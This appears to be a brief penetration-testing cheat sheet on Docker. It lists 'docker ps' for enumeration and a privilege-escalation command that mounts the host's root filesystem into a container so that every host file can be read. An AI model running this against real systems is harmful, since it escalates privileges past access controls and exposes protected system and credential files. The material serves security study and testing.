# Docker

## Enumeration

View running containers:

`docker ps`

\`\`

\`\`

## Priv esc

If we have a user which is part of the `docker` group we can mount the file system to the docker and see all files

mount the file system:

`docker run -v /:/hostOS -i -t [image name] bash`

* `-v /:/hostOS` - mount the host’s `/` as `/hostOS` inside the image
* `-i` - interactive
* `-t` - create a tty
* `[image name]` - the name of the image to run, got from `docker ps above`
* `bash` - command to run

